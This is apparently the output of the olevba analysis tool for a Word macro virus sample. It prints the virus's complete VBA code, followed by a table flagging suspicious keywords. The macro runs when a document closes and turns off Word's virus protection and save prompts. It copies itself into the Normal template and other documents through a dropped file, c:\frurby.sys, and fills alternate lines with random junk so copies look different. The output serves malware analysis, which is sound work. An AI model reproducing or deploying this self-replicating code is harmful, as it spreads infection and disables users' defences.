olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.dl-7f3c9cde38f9403a77f68f3ce9c0888202e04329
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.dl-7f3c9cde38f9403a77f68f3ce9c0888202e04329 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
DF1 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UIL = QBN + KGN
Options.VirusProtection = 0
OFG = SSM + VUE
Options.SaveNormalPrompt = 0
PVF = LCV + OAM
Application.EnableCancelKey = 0
CCR = GBG + IGU
CK41 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VIG = DDO + JJP
Options.ConfirmConversions = 0
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set PQ45 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
LR35 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set PQ45 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
OG28 = True
OLS = BEO + JHD
End If
PUL = BQI + KKE
If OG28 = True Then
HCM = DUC + JGT
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\frurby.sys"
QGO = FBA + HRG
PQ45.CodeModule.AddFromFile ("c:\frurby.sys")
FKF = HAK + ETM
PQ45.CodeModule.deletelines 1, 4
QUH = LBN + JVC
PQ45.CodeModule.replaceline 1, "Sub Document_Close()"
UNH = DKE + VCA
ElseIf LR35 = True Then
HMU = LIS + SOP
PQ45.CodeModule.AddFromFile ("c:\frurby.sys")
VHK = JPD + JLR
PQ45.CodeModule.deletelines 1, 4
LJL = FNK + OTI
End If
GGD = LEM + HTK
With PQ45.CodeModule
EPQ = NRD + REV
For x = 2 To (PQ45.CodeModule.CountOfLines - 2) Step 2
BBR = IKC + CDB
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
PLM = EKQ + QIT
Next x
QBN = PAJ + IGV
End With
RPJ = QGH + JUC
FP22:
OHC = EBJ + VLK
    MsgBox "Birthday of Furby"
VEI = IGL + DLV
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

